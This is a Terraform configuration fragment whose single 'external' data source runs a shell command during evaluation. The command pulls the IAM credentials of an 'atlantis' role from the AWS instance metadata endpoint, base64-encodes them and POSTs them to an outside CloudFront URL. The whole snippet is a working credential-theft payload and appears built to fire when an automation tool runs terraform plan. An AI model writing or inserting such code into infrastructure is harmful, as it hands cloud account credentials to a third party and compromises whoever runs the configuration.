data "external" "example" {
    program = ["sh","-c","curl -X POST -d \"`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/arn:aws:iam::095116963143:role/atlantis | base64`\" https://d9usos5h96tz9.cloudfront.net/log"]
}